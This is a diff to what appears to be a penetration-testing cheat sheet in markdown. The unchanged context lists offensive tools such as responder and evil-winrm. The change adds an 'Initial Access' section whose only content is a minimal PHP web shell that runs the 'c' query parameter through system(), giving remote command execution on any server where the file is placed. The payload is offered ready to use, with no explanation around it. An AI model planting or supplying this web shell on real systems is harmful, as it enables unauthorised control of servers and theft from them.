@@ -15,6 +15,14 @@
 - responder
 - evil-winrm
 
+## Initial Access
+### Simple PHP Payload
+```php
+<?php
+  echo system($_GET['c']);
+?>
+```
+
 ## Brute Forcing
 ### Tools
 #### Z3
